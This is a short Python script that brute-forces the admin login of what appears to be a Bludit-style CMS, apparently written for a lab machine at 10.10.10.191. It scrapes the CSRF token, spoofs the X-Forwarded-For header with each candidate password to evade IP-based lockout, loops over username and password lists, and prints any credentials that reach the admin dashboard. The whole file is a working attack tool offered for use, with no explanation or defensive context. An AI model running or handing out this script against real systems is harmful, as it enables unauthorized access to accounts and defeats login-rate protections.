from requests import Session
from re import search
from sys import argv

def force(target_url, username, password):
    session = Session()
    login_page = session.get(target_url)
    csrf_token = search('input.+?name="tokenCSRF".+?value="(.+?)"', login_page.text).group(1)
    
    print(f"[*] Trying : {username}:{password}")

    
    headers = {
        'X-Forwarded-For': password,
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36',
        'Referer': target_url
    }

    data = {
        'tokenCSRF': csrf_token,
        'username': username,
        'password': password,
        'save': ''
    }

    login_result = session.post(target_url, headers=headers, data=data, allow_redirects=False)
    if "/admin/dashboard" in login_result.headers["location"]:
        print(f"CREDENTIALS FOUND!\n\nUsername = {username}\nPassword = {password}")

def main():
    try:
        target_ip = argv[1]
        my_passlist = open(argv[2], "r+", encoding="utf-8")
        my_userlist = open(argv[3], "r+", encoding="utf-8")

        with my_userlist as userlist:
            for username in userlist:
                with my_passlist as passlist:
                    for password in passlist:
                        force(target_ip.strip(), username.strip(), password.strip())
    
    except Exception as ex: 
        print(f"Usage : python {argv[0]} [target_url] [passwordlist] [usernamelist]\nExample : python {argv[0]} http://10.10.10.191/admin passlist.txt userlist.txt\n{ex}")

if __name__ == "__main__": main()
